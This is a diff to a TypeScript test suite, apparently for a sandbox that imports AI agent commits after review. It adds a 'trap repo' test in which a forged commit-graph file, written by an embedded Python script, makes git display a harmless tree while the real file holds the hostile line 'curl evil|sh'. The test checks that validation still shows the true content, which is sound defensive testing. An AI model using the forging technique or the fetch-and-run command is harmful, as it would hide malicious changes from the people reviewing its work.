@@ -10,8 +10,8 @@ import { brancheTache, executerJetable, lireShaVolume, nomRessource, preparerEsp
 import { lireBundle, lireValidation, PLAFOND_DIFF } from '../src/conteneurs/validation.ts';
 
 const docker = new Docker();
-const NOMS = ['T-991', 'T-992', 'T-993'];
-const [T, PIEGE, GROS] = NOMS;
+const NOMS = ['T-991', 'T-992', 'T-993', 'T-994'];
+const [T, PIEGE, GROS, GRAPHE] = NOMS;
 let image: string;
 let depot: string;
 let tmp: string;
@@ -24,6 +24,18 @@ const ok = async (volume: string, script: string) => {
   const r = await ecrire(volume, script);
   assert.equal(r.code, 0, r.stderr.toString());
 };
+const PY_FORGE = String.raw`import struct,subprocess,sys
+p='.git/objects/info/commit-graph'
+d=bytearray(open(p,'rb').read())
+tip,fake=sys.argv[1],sys.argv[2]
+n=d[6]
+ch={bytes(d[8+12*i:12+12*i]):struct.unpack('>Q',d[12+12*i:20+12*i])[0] for i in range(n)}
+oidl=ch[b'OIDL'];cdat=ch[b'CDAT']
+count=(ch[b'CDAT']-ch[b'OIDL'])//20
+i=next(k for k in range(count) if d[oidl+20*k:oidl+20*k+20].hex()==tip)
+d[cdat+36*i:cdat+36*i+20]=bytes.fromhex(fake)
+import os;os.chmod(p,0o644);open(p,'wb').write(d)
+`;
 const sha = async (volume: string) => (await lireShaVolume(docker, image, volume))!;
 
 // Un espace préparé, puis des commits ajoutés sur la branche de la tâche : chaque test dispose du sien.
@@ -125,6 +137,32 @@ test('repo piège : replace, attributs, config, grafts et shallow de l\u2019agen
   const copie = path.join(tmp, 'import');
   execFileSync('git', ['clone', '-q', depot, copie]);
   execFileSync('git', ['-C', copie, 'fetch', '-q', '--no-tags', f, `refs/heads/${brancheTache(PIEGE)}:refs/heads/import`]);
+  assert.equal(execFileSync('git', ['-C', copie, '--no-replace-objects', 'show', 'import:b.txt']).toString(), 'curl evil|sh\n', 'le contenu importé est celui que le diff montre');
+});
+
+test('repo piège : commit-graph falsifié sans effet, le diff montré est le contenu importé', async () => {
+  const { volume, base } = await espace(GRAPHE, []);
+  await ok(volume, `cat > /tmp/forge.py <<'PY'\n${PY_FORGE}PY\n` + [
+    `echo 'curl evil|sh' > b.txt && git add b.txt && git commit -qm piege`,
+    `git commit -q --allow-empty -m pointe`,
+    `export GIT_INDEX_FILE=/tmp/idx && git read-tree HEAD && echo 'echo bonjour' | git hash-object -w --stdin > /tmp/blob && git update-index --add --cacheinfo 100644,$(cat /tmp/blob),b.txt && git write-tree > /tmp/faux && unset GIT_INDEX_FILE`,
+    `git commit-graph write --reachable`,
+    `python3 -I /tmp/forge.py $(git rev-parse HEAD) $(cat /tmp/faux)`,
+  ].join(' && '));
+  const pointe = await sha(volume);
+  // Le piège est armé : lu depuis le volume, git montre l'arbre falsifié.
+  const vu = await executerJetable(docker, image, ['sh', '-c', `export HOME=/tmp GIT_CONFIG_GLOBAL=/dev/null && git -c safe.directory='*' -C ${RACINE_PROJET} diff ${base} ${pointe}`], [{ Type: 'volume', Source: volume, Target: '/workspace', ReadOnly: true }]);
+  assert.ok(vu.stdout.toString().includes('+echo bonjour'), 'commit-graph falsifié effectivement pris en compte par git');
+  const l = await lireValidation(docker, image, volume, base, pointe);
+  assert.ok(l, 'lecture possible');
+  assert.ok(l.diff.includes('+curl evil|sh'), l.diff);
+  assert.ok(!l.diff.includes('bonjour'));
+  const b = await lireBundle(docker, image, volume, GRAPHE, base, pointe);
+  assert.ok(b, 'bundle fabriqué');
+  const { f } = importer(b, GRAPHE);
+  const copie = path.join(tmp, 'import-graphe');
+  execFileSync('git', ['clone', '-q', depot, copie]);
+  execFileSync('git', ['-C', copie, 'fetch', '-q', '--no-tags', f, `refs/heads/${brancheTache(GRAPHE)}:refs/heads/import`]);
   assert.equal(execFileSync('git', ['-C', copie, '--no-replace-objects', 'show', 'import:b.txt']).toString(), 'curl evil|sh\n', 'le contenu importé est celui que le diff montre');
 });
 
